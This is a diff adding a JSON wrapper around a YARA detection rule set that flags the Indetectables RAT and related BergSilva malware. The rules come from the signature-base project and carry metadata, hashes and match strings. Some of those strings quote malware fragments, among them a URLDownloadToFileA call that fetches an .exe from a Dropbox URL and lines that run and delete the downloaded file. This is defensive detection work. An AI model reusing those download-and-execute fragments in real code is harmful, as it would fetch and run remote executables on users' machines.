@@ -1,0 +1,38 @@
+{
+  "slug": "apt_indetectables_rat",
+  "filename": "apt_indetectables_rat.yar",
+  "source": "github.com/Neo23x0/signature-base",
+  "license": "Detection Rule License 1.1",
+  "headerComment": "Yara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2015-10-01\n\tIdentifier: Indetectables RAT",
+  "rules": [
+    {
+      "name": "Indetectables_RAT",
+      "meta": {
+        "description": "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux",
+        "license": "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE",
+        "author": "Florian Roth (Nextron Systems)",
+        "reference": "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/",
+        "date": "2015-10-01",
+        "super_rule": "1",
+        "hash1": "081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105",
+        "hash2": "66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229",
+        "hash3": "1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801",
+        "id": "f8322822-617c-50cf-8b64-60da3a202ca5"
+      }
+    },
+    {
+      "name": "BergSilva_Malware",
+      "meta": {
+        "description": "Detects a malware from the same author as the Indetectables RAT",
+        "license": "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE",
+        "author": "Florian Roth (Nextron Systems)",
+        "date": "2015-10-01",
+        "super_rule": "1",
+        "hash1": "00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e",
+        "hash2": "6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc",
+        "id": "5f35aea6-1d80-594a-a6e0-8e8bb30bc358"
+      }
+    }
+  ],
+  "body": "/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2015-10-01\n\tIdentifier: Indetectables RAT\n*/\n\nrule Indetectables_RAT {\n\tmeta:\n\t\tdescription = \"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux\"\n\t\tlicense = \"Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE\"\n\t\tauthor = \"Florian Roth (Nextron Systems)\"\n\t\treference = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105\"\n\t\thash2 = \"66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229\"\n\t\thash3 = \"1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801\"\n\t\tid = \"f8322822-617c-50cf-8b64-60da3a202ca5\"\n\tstrings:\n\t\t$s1 = \"Coded By M3\" fullword wide\n\t\t$s2 = \"Stub Undetector M3\" fullword wide\n\t\t$s3 = \"www.webmenegatti.com.br\" wide\n\t\t$s4 = \"M3n3gatt1\" fullword wide\n\t\t$s5 = \"TheMisterFUD\" fullword wide\n\t\t$s6 = \"KillZoneKillZoneKill\" fullword ascii\n\t\t$s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n\t\t$s8 = \"M3_F_U_D_M3\" ascii\n\t\t$s9 = \"M3n3gatt1hack3r\" fullword wide\n\t\t$s10 = \"M3n3gatt1hack3r\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 1 of them\n}\n\nrule BergSilva_Malware {\n\tmeta:\n\t\tdescription = \"Detects a malware from the same author as the Indetectables RAT\"\n\t\tlicense = \"Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE\"\n\t\tauthor = \"Florian Roth (Nextron Systems)\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e\"\n\t\thash2 = \"6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc\"\n\t\tid = \"5f35aea6-1d80-594a-a6e0-8e8bb30bc358\"\n\tstrings:\n\t\t$x1 = \"C:\\\\Users\\\\Berg Silva\\\\Desktop\\\\\" wide\n\t\t$x2 = \"URLDownloadToFileA 0, \\\"https://dl.dropbox.com/u/105015858/nome.exe\\\", \\\"c:\\\\nome.exe\\\", 0, 0\" fullword wide\n\n\t\t$s1 = \" Process.Start (Path.GetTempPath() & \\\"name\\\" & \\\".exe\\\") 'start server baixado\" fullword wide\n\t\t$s2 = \"FileDelete(@TempDir & \\\"\\\\nome.exe\\\") ;Deleta o Arquivo para que possa ser executado normalmente\" fullword wide\n\t\t$s3 = \" Lib \\\"\\\\WINDOWS\\\\system32\\\\UsEr32.dLl\\\"\" fullword wide\n\t\t$s4 = \"$Directory = @TempDir & \\\"\\\\nome.exe\\\" ;Define a variavel\" fullword wide\n\t\t$s5 = \"https://dl.dropbox.com/u/105015858\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )\n}\n"
+}
